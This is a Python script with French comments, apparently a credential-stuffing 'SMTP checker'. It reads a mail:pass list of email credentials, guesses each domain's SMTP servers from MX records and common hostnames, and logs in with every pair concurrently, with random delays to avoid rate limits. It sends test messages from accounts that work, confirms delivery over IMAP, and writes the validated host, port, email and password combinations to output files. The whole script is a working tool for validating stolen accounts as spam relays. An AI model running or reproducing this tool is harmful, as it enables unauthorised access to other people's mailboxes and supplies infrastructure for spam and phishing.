import smtplib
import imaplib
import email
import dns.resolver
import time
import getpass
import threading
import concurrent.futures
from email.mime.text import MimeText
from email.mime.multipart import MimeMultipart
from datetime import datetime, timedelta
import socket
import ssl
import re
import random
import hashlib
import logging
from collections import defaultdict
import queue

# Configuration du logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AdvancedSMTPTester:
    def __init__(self):
        # Ports SMTP courants (ordre de priorité)
        self.smtp_ports = [587, 465, 25, 2525, 2587]
        
        # Préfixes SMTP courants
        self.smtp_prefixes = [
            'smtp', 'mail', 'send', 'outgoing', 'out', 'mx', 'relay',
            'smtp1', 'smtp2', 'smtp3', 'smtp4', 'smtp5',
            'mail1', 'mail2', 'mail3', 'mail4', 'mail5',
            'mta', 'postfix', 'sendmail', 'exim'
        ]
        
        # Serveurs SMTP connus (base de données étendue)
        self.known_smtp_servers = {
            # Gmail et Google Workspace
            'gmail.com': [('smtp.gmail.com', 587), ('smtp.gmail.com', 465)],
            'googlemail.com': [('smtp.gmail.com', 587), ('smtp.gmail.com', 465)],
            
            # Microsoft
            'outlook.com': [('smtp-mail.outlook.com', 587), ('smtp.office365.com', 587)],
            'hotmail.com': [('smtp-mail.outlook.com', 587), ('smtp.live.com', 587)],
            'live.com': [('smtp-mail.outlook.com', 587), ('smtp.live.com', 587)],
            'msn.com': [('smtp-mail.outlook.com', 587)],
            
            # Yahoo
            'yahoo.com': [('smtp.mail.yahoo.com', 587), ('smtp.mail.yahoo.com', 465)],
            'yahoo.fr': [('smtp.mail.yahoo.fr', 587), ('smtp.mail.yahoo.fr', 465)],
            'yahoo.co.uk': [('smtp.mail.yahoo.co.uk', 587)],
            'ymail.com': [('smtp.mail.yahoo.com', 587)],
            
            # Français
            'laposte.net': [('smtp.laposte.net', 587), ('smtp.laposte.net', 465)],
            'orange.fr': [('smtp.orange.fr', 587), ('smtp.orange.fr', 465)],
            'wanadoo.fr': [('smtp.orange.fr', 587)],
            'free.fr': [('smtp.free.fr', 587), ('smtp.free.fr', 465)],
            'sfr.fr': [('smtp.sfr.fr', 587), ('smtp.sfr.fr', 465)],
            'neuf.fr': [('smtp.sfr.fr', 587)],
            'bbox.fr': [('smtp.bbox.bouyguestelecom.fr', 587)],
            'bouyguestelecom.fr': [('smtp.bbox.bouyguestelecom.fr', 587)],
            'numericable.fr': [('smtp.numericable.fr', 587)],
            'aliceadsl.fr': [('smtp.aliceadsl.fr', 587)],
            
            # Allemagne
            'gmx.de': [('mail.gmx.net', 587), ('mail.gmx.net', 465)],
            'gmx.net': [('mail.gmx.net', 587), ('mail.gmx.net', 465)],
            'web.de': [('smtp.web.de', 587), ('smtp.web.de', 465)],
            't-online.de': [('securesmtp.t-online.de', 587)],
            
            # Autres européens
            'libero.it': [('smtp.libero.it', 587)],
            'virgilio.it': [('out.virgilio.it', 587)],
            'tiscali.it': [('smtp.tiscali.it', 587)],
            'mail.ru': [('smtp.mail.ru', 587), ('smtp.mail.ru', 465)],
            'yandex.ru': [('smtp.yandex.ru', 587), ('smtp.yandex.ru', 465)],
            'rambler.ru': [('smtp.rambler.ru', 587)],
            
            # Autres
            'aol.com': [('smtp.aol.com', 587)],
            'zoho.com': [('smtp.zoho.com', 587), ('smtp.zoho.com', 465)],
            'protonmail.com': [('127.0.0.1', 1025)],  # Nécessite bridge
            'tutanota.com': [('mail.tutanota.com', 587)],
        }
        
        # Serveurs IMAP correspondants
        self.imap_servers = {
            'gmail.com': ('imap.gmail.com', 993),
            'googlemail.com': ('imap.gmail.com', 993),
            'outlook.com': ('imap-mail.outlook.com', 993),
            'hotmail.com': ('imap-mail.outlook.com', 993),
            'live.com': ('imap-mail.outlook.com', 993),
            'yahoo.com': ('imap.mail.yahoo.com', 993),
            'yahoo.fr': ('imap.mail.yahoo.fr', 993),
            'laposte.net': ('imap.laposte.net', 993),
            'orange.fr': ('imap.orange.fr', 993),
            'free.fr': ('imap.free.fr', 993),
            'sfr.fr': ('imap.sfr.fr', 993),
            'gmx.de': ('imap.gmx.net', 993),
            'web.de': ('imap.web.de', 993),
            'mail.ru': ('imap.mail.ru', 993),
            'yandex.ru': ('imap.yandex.ru', 993),
            'aol.com': ('imap.aol.com', 993),
            'zoho.com': ('imap.zoho.com', 993),
        }
        
        # Cache pour éviter les requêtes DNS répétées
        self.dns_cache = {}
        self.tested_servers = defaultdict(dict)
        
        # Paramètres de performance
        self.max_workers = 50
        self.connection_timeout = 15
        self.smtp_timeout = 20
        self.max_retries = 3
        
        # Statistiques
        self.stats = {
            'total_accounts': 0,
            'successful_connections': 0,
            'successful_sends': 0,
            'emails_received': 0,
            'valid_configurations': 0,
            'domains_processed': set(),
            'unique_smtp_servers': set()
        }

    def get_mx_records(self, domain):
        """Récupère les enregistrements MX avec cache"""
        if domain in self.dns_cache:
            return self.dns_cache[domain]
        
        try:
            mx_records = []
            # Essayer différents resolvers DNS
            resolvers = ['8.8.8.8', '1.1.1.1', '208.67.222.222']
            
            for resolver_ip in resolvers:
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [resolver_ip]
                    resolver.timeout = 5
                    resolver.lifetime = 10
                    
                    answers = resolver.resolve(domain, 'MX')
                    mx_records = [(str(mx.exchange).rstrip('.'), mx.preference) for mx in answers]
                    break
                except Exception:
                    continue
            
            # Trier par priorité
            mx_records.sort(key=lambda x: x[1])
            self.dns_cache[domain] = mx_records
            return mx_records
            
        except Exception as e:
            logger.warning(f"Erreur MX pour {domain}: {e}")
            self.dns_cache[domain] = []
            return []

    def generate_smtp_candidates(self, domain, mx_records):
        """Génère tous les candidats SMTP possibles"""
        candidates = set()
        
        # 1. Serveurs connus
        if domain in self.known_smtp_servers:
            for smtp_host, port in self.known_smtp_servers[domain]:
                candidates.add((smtp_host, port))
        
        # 2. Basé sur les MX records
        for mx_host, priority in mx_records:
            for port in self.smtp_ports:
                candidates.add((mx_host, port))
                
                # Variations du nom MX
                for prefix in self.smtp_prefixes:
                    # Remplacer le début
                    if mx_host.startswith(('mx', 'mail', 'in')):
                        new_host = mx_host.replace(mx_host.split('.')[0], prefix, 1)
                        candidates.add((new_host, port))
                    
                    # Ajouter le préfixe
                    if not mx_host.startswith(prefix):
                        candidates.add((f"{prefix}.{domain}", port))
        
        # 3. Patterns courants pour le domaine
        for prefix in self.smtp_prefixes:
            for port in self.smtp_ports:
                candidates.add((f"{prefix}.{domain}", port))
        
        # 4. Essayer le domaine lui-même
        for port in self.smtp_ports:
            candidates.add((domain, port))
        
        # 5. Variations avec sous-domaines
        common_subdomains = ['www', 'server', 'host', 'email', 'messaging']
        for subdomain in common_subdomains:
            for prefix in self.smtp_prefixes[:3]:  # Limiter pour éviter trop de tests
                for port in [587, 465]:  # Ports les plus courants
                    candidates.add((f"{prefix}.{subdomain}.{domain}", port))
        
        return list(candidates)

    def test_smtp_connection(self, smtp_host, port, email_addr, password):
        """Teste la connexion SMTP avec retry et timeouts optimisés"""
        for attempt in range(self.max_retries):
            try:
                # Test de connectivité socket d'abord
                sock = socket.create_connection((smtp_host, port), timeout=self.connection_timeout)
                sock.close()
                
                # Test SMTP
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                if port == 465:
                    server = smtplib.SMTP_SSL(smtp_host, port, timeout=self.smtp_timeout, context=context)
                else:
                    server = smtplib.SMTP(smtp_host, port, timeout=self.smtp_timeout)
                    if port in [587, 2587]:
                        server.starttls(context=context)
                
                # Authentification
                server.login(email_addr, password)
                server.quit()
                
                return True, f"Connexion réussie (tentative {attempt + 1})"
                
            except smtplib.SMTPAuthenticationError as e:
                return False, f"Erreur d'authentification: {str(e)}"
            except smtplib.SMTPException as e:
                error_msg = str(e).lower()
                if "authentication" in error_msg or "login" in error_msg:
                    return False, f"Erreur d'authentification: {str(e)}"
                elif attempt < self.max_retries - 1:
                    time.sleep(random.uniform(1, 3))
                    continue
                else:
                    return False, f"Erreur SMTP: {str(e)}"
            except socket.error as e:
                if attempt < self.max_retries - 1:
                    time.sleep(random.uniform(1, 3))
                    continue
                else:
                    return False, f"Erreur de connexion: {str(e)}"
            except Exception as e:
                if attempt < self.max_retries - 1:
                    time.sleep(random.uniform(1, 3))
                    continue
                else:
                    return False, f"Erreur inconnue: {str(e)}"
        
        return False, "Toutes les tentatives ont échoué"

    def send_test_email(self, smtp_host, port, from_email, password, to_email):
        """Envoie un email de test avec identifiant unique"""
        try:
            # Créer un identifiant unique pour ce test
            test_id = hashlib.md5(f"{smtp_host}:{port}:{from_email}:{datetime.now().isoformat()}".encode()).hexdigest()[:8]
            
            msg = MimeMultipart()
            msg['From'] = from_email
            msg['To'] = to_email
            msg['Subject'] = f"SMTP-TEST-{test_id}-{smtp_host}-{port}"
            
            body = f"""
TEST SMTP AUTOMATIQUE
====================
Serveur: {smtp_host}:{port}
Expéditeur: {from_email}
ID de test: {test_id}
Timestamp: {datetime.now().isoformat()}
====================
Ce message confirme que le serveur SMTP fonctionne correctement.
            """
            
            msg.attach(MimeText(body, 'plain'))
            
            # Envoyer l'email
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            if port == 465:
                server = smtplib.SMTP_SSL(smtp_host, port, timeout=self.smtp_timeout, context=context)
            else:
                server = smtplib.SMTP(smtp_host, port, timeout=self.smtp_timeout)
                if port in [587, 2587]:
                    server.starttls(context=context)
            
            server.login(from_email, password)
            server.send_message(msg)
            server.quit()
            
            return True, f"Email envoyé avec ID: {test_id}", test_id
            
        except Exception as e:
            return False, f"Erreur lors de l'envoi: {str(e)}", None

    def find_smtp_servers_for_email(self, email_addr, password):
        """Trouve tous les serveurs SMTP valides pour un email donné"""
        domain = email_addr.split('@')[1]
        self.stats['domains_processed'].add(domain)
        
        logger.info(f"Analyse du domaine: {domain}")
        
        # Récupérer les MX records
        mx_records = self.get_mx_records(domain)
        
        # Générer tous les candidats SMTP
        candidates = self.generate_smtp_candidates(domain, mx_records)
        
        # Éviter les doublons et les serveurs déjà testés
        unique_candidates = []
        for host, port in candidates:
            key = f"{host}:{port}"
            if key not in self.tested_servers[domain]:
                unique_candidates.append((host, port))
        
        logger.info(f"Test de {len(unique_candidates)} serveurs SMTP pour {domain}")
        
        valid_servers = []
        
        # Tester en parallèle avec ThreadPoolExecutor
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(20, len(unique_candidates))) as executor:
            future_to_server = {
                executor.submit(self.test_smtp_connection, host, port, email_addr, password): (host, port)
                for host, port in unique_candidates
            }
            
            for future in concurrent.futures.as_completed(future_to_server):
                host, port = future_to_server[future]
                key = f"{host}:{port}"
                
                try:
                    success, message = future.result()
                    self.tested_servers[domain][key] = (success, message)
                    
                    if success:
                        valid_servers.append((host, port))
                        self.stats['successful_connections'] += 1
                        self.stats['unique_smtp_servers'].add(f"{host}:{port}")
                        logger.info(f"✓ {email_addr} -> {host}:{port}")
                    else:
                        logger.debug(f"✗ {email_addr} -> {host}:{port} : {message}")
                        
                except Exception as e:
                    logger.error(f"Erreur lors du test {host}:{port}: {e}")
        
        return valid_servers

    def check_received_emails(self, imap_host, port, email_addr, password, test_ids, timeout=120):
        """Vérifie les emails reçus avec recherche par ID de test"""
        try:
            # Connexion IMAP avec retry
            for attempt in range(3):
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    mail = imaplib.IMAP4_SSL(imap_host, port, ssl_context=context)
                    mail.login(email_addr, password)
                    mail.select('inbox')
                    break
                except Exception as e:
                    if attempt < 2:
                        time.sleep(5)
                        continue
                    else:
                        raise e
            
            received_test_ids = set()
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                try:
                    # Rechercher les emails de test récents
                    search_date = (datetime.now() - timedelta(minutes=30)).strftime("%d-%b-%Y")
                    result, data = mail.search(None, f'(SINCE "{search_date}" SUBJECT "SMTP-TEST")')
                    
                    if result == 'OK' and data[0]:
                        email_ids = data[0].split()
                        
                        for email_id in email_ids:
                            try:
                                result, data = mail.fetch(email_id, '(RFC822)')
                                if result == 'OK':
                                    raw_email = data[0][1]
                                    email_message = email.message_from_bytes(raw_email)
                                    subject = email_message.get('Subject', '')
                                    
                                    # Extraire l'ID de test du sujet
                                    match = re.search(r'SMTP-TEST-([a-f0-9]{8})-', subject)
                                    if match:
                                        test_id = match.group(1)
                                        if test_id in test_ids:
                                            received_test_ids.add(test_id)
                                            logger.info(f"Email reçu pour test ID: {test_id}")
                            except Exception as e:
                                logger.warning(f"Erreur lors de la lecture d'un email: {e}")
                    
                    # Vérifier si tous les emails attendus sont reçus
                    if len(received_test_ids) == len(test_ids):
                        break
                    
                    time.sleep(5)  # Attendre avant la prochaine vérification
                    
                except Exception as e:
                    logger.warning(f"Erreur lors de la recherche d'emails: {e}")
                    time.sleep(5)
            
            mail.close()
            mail.logout()
            
            return received_test_ids
            
        except Exception as e:
            logger.error(f"Erreur IMAP: {e}")
            return set()

    def process_email_batch(self, email_batch, test_email):
        """Traite un lot d'emails"""
        batch_results = []
        
        for email_addr, password in email_batch:
            try:
                self.stats['total_accounts'] += 1
                
                # Trouver les serveurs SMTP valides
                valid_servers = self.find_smtp_servers_for_email(email_addr, password)
                
                if not valid_servers:
                    logger.warning(f"Aucun serveur SMTP trouvé pour {email_addr}")
                    continue
                
                # Tester l'envoi d'emails
                for smtp_host, port in valid_servers:
                    try:
                        success, message, test_id = self.send_test_email(
                            smtp_host, port, email_addr, password, test_email
                        )
                        
                        if success:
                            self.stats['successful_sends'] += 1
                            batch_results.append({
                                'email': email_addr,
                                'password': password,
                                'smtp_host': smtp_host,
                                'smtp_port': port,
                                'test_id': test_id,
                                'timestamp': datetime.now()
                            })
                            logger.info(f"✓ Email envoyé: {email_addr} -> {smtp_host}:{port}")
                        else:
                            logger.warning(f"✗ Échec envoi: {email_addr} -> {smtp_host}:{port} : {message}")
                            
                    except Exception as e:
                        logger.error(f"Erreur lors de l'envoi depuis {email_addr}: {e}")
                
                # Pause entre les comptes pour éviter les limitations
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                logger.error(f"Erreur lors du traitement de {email_addr}: {e}")
        
        return batch_results

    def run_comprehensive_test(self, filename, test_email, check_email, check_password):
        """Exécute un test complet avec gestion avancée"""
        logger.info("=== DÉBUT DU TEST SMTP COMPLET ===")
        
        # Lire et valider le fichier
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            logger.error(f"Fichier {filename} non trouvé!")
            return
        
        # Parser les emails
        email_list = []
        for line in lines:
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and '@' in parts[0]:
                    email_list.append((parts[0], parts[1]))
        
        if not email_list:
            logger.error("Aucun email valide trouvé dans le fichier!")
            return
        
        logger.info(f"Traitement de {len(email_list)} comptes email")
        
        # Déterminer le serveur IMAP pour la vérification
        check_domain = check_email.split('@')[1]
        if check_domain not in self.imap_servers:
            logger.error(f"Serveur IMAP non configuré pour {check_domain}")
            return
        
        imap_host, imap_port = self.imap_servers[check_domain]
        
        # Traiter les emails par lots
        batch_size = 50
        all_results = []
        
        for i in range(0, len(email_list), batch_size):
            batch = email_list[i:i+batch_size]
            logger.info(f"Traitement du lot {i//batch_size + 1}/{(len(email_list)-1)//batch_size + 1}")
            
            batch_results = self.process_email_batch(batch, test_email)
            all_results.extend(batch_results)
            
            # Pause entre les lots
            if i + batch_size < len(email_list):
                time.sleep(random.uniform(5, 10))
        
        if not all_results:
            logger.warning("Aucun email de test envoyé avec succès!")
            return
        
        # Attendre la réception des emails
        logger.info("=== ATTENTE DE LA RÉCEPTION DES EMAILS ===")
        test_ids = {result['test_id'] for result in all_results if result['test_id']}
        
        logger.info(f"Vérification de {len(test_ids)} emails de test...")
        received_test_ids = self.check_received_emails(
            imap_host, imap_port, check_email, check_password, test_ids
        )
        
        self.stats['emails_received'] = len(received_test_ids)
        
        # Identifier les configurations valides
        valid_configs = []
        for result in all_results:
            if result['test_id'] in received_test_ids:
                valid_configs.append(result)
                self.stats['valid_configurations'] += 1
        
        # Sauvegarder les résultats
        if valid_configs:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_filename = f"smtp_valides_{timestamp}.txt"
            
            with open(output_filename, 'w', encoding='utf-8') as f:
                for config in valid_configs:
                    f.write(f"{config['smtp_host']}|{config['smtp_port']}|{config['email']}|{config['password']}\n")
            
            logger.info(f"=== RÉSULTATS SAUVEGARDÉS ===")
            logger.info(f"Fichier: {output_filename}")
            logger.info(f"Configurations valides: {len(valid_configs)}")
            
            # Sauvegarder aussi un rapport détaillé
            report_filename = f"rapport_smtp_{timestamp}.txt"
            with open(report_filename, 'w', encoding='utf-8') as f:
                f.write("=== RAPPORT DÉTAILLÉ DES TESTS SMTP ===\n\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Comptes testés: {self.stats['total_accounts']}\n")
                f.write(f"Domaines uniques: {len(self.stats['domains_processed'])}\n")
                f.write(f"Connexions SMTP réussies: {self.stats['successful_connections']}\n")
                f.write(f"Emails envoyés: {self.stats['successful_sends']}\n")
                f.write(f"Emails reçus: {self.stats['emails_received']}\n")
                f.write(f"Configurations valides: {self.stats['valid_configurations']}\n")
                f.write(f"Serveurs SMTP uniques: {len(self.stats['unique_smtp_servers'])}\n\n")
                
                f.write("=== DOMAINES TRAITÉS ===\n")
                for domain in sorted(self.stats['domains_processed']):
                    f.write(f"{domain}\n")
                
                f.write(f"\n=== SERVEURS SMTP UNIQUES ===\n")
                for server in sorted(self.stats['unique_smtp_servers']):
                    f.write(f"{server}\n")
                
                f.write(f"\n=== CONFIGURATIONS VALIDES ===\n")
                for config in valid_configs:
                    f.write(f"{config['smtp_host']}|{config['smtp_port']}|{config['email']}|{config['password']}\n")
        
        else:
            logger.warning("=== AUCUNE CONFIGURATION VALIDE TROUVÉE ===")
        
        # Afficher les statistiques finales
        logger.info("=== STATISTIQUES FINALES ===")
        logger.info(f"Comptes testés: {self.stats['total_accounts']}")
        logger.info(f"Domaines uniques: {len(self.stats['domains_processed'])}")
        logger.info(f"Connexions SMTP réussies: {self.stats['successful_connections']}")
        logger.info(f"Emails envoyés: {self.stats['successful_sends']}")
        logger.info(f"Emails reçus: {self.stats['emails_received']}")
        logger.info(f"Configurations valides: {self.stats['valid_configurations']}")
        logger.info(f"Taux de réussite: {(self.stats['valid_configurations']/self.stats['total_accounts']*100):.2f}%")

def main():
    print("=== TESTEUR SMTP AVANCÉ POUR MILLIONS DE DOMAINES ===\n")
    
    # Saisie des paramètres
    filename = input("Nom du fichier mail:pass: ")
    test_email = input("Email de destination pour les tests: ")
    
    print("\nIdentifiants pour vérifier la réception:")
    check_email = input("Email de vérification: ")
    check_password = getpass.getpass("Mot de passe de vérification: ")
    
    # Lancer le test
    tester = AdvancedSMTPTester()
    tester.run_comprehensive_test(filename, test_email, check_email, check_password)

if __name__ == "__main__":
    main()
